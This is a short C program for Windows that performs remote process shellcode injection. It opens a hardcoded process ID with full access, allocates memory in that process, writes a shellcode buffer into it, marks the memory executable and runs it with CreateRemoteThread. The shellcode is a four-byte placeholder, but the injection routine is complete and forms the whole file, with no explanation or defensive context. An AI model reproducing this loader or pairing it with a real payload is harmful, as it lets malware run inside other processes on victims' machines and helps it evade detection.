#include <windows.h>
#include <stdio.h>  

// shellcode here
unsigned char shellcode[] = {
    0x6c, 0x33, 0x33, 0x74
};

#define TARGET_PID 1234  // Target PID

int main(void)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,
        FALSE,
        TARGET_PID);

    printf("[i] Opened Handle To Target Process (PID: %d)\n", TARGET_PID);

    // allocate memory in the target process
    PVOID remoteAddr = VirtualAllocEx(hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    printf("[i] Allocated Memory At: 0x%p\n", remoteAddr);
    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    // write shellcode to target process memory
    SIZE_T bytesWritten = 0;

    WriteProcessMemory(hProcess,
        remoteAddr,
        shellcode,
        sizeof(shellcode),
        &bytesWritten);

    printf("[i] Successfully Written %llu Bytes\n", bytesWritten);

    //change memory permissions to executable
    DWORD oldProtect;

    VirtualProtectEx(hProcess,
        remoteAddr,
        sizeof(shellcode),
        PAGE_EXECUTE_READ,
        &oldProtect);

    // prompt before executing payload
    printf("[#] Press <Enter> To Execute Payload ... ");
    getchar();

    // create remote thread to execute shellcode
    HANDLE hThread = CreateRemoteThread(hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteAddr,
        NULL,
        0,
        NULL);

    printf("[+] Remote Thread Created Successfully!\n");

    // clean up
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
